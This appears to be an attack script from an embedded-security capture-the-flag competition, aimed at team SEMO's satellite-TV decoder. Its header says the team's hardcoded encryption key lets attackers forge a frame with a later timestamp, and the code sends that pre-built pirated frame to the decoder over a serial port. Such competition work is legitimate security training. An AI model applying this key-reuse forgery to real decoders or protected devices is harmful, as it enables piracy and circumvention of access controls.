"""Pesky Neighbor attack for SEMO
@author: Gavin Zhong, Liz Grzyb
@description: Liz - SEMO implements a timestamp check, but provides hardcoded encryption keys in their source code. 
We were able to generate a new frame with a later timestamp and encrypt it with the provided key and IV. The decoder
accepts this pirated frame as a valid frame. 
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_1() -> bytes:
    """Liz Grzyb
        Play the fake frame with a later timestamp
    """
    lgmt_frame_channel1 = b'u\xc4\xd9\nU\x00\x12\x8c\xd4c\'\x9bM\x08\xdb\xf4\'U\xc7\xfc\x8e\xbd\xa2\x89\xde%\xa9\xfbE\xe6\xaeDn\xe8\xa1S!]"4\xb7r.k\xe3xm\xd3w\x86.*Z\x91\xb8\xc8\xcf\xe4\xafK\x13^\x9fk\xd4\xec\xd9\x12g,\xce\x87bT\x8fHN\xfe\x9d\xc9\x03\x07|!\xd3\xe1\x99\n\xd1\x8dKW\xa2\xc0\x1d\xb7'
    return lgmt_frame_channel1


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Play pirated channel 1 frame
    interface.decode(lgmt_channel_1())
    interface.decode(lgmt_channel_1())

    print("Done with pesky Neighbor attack")
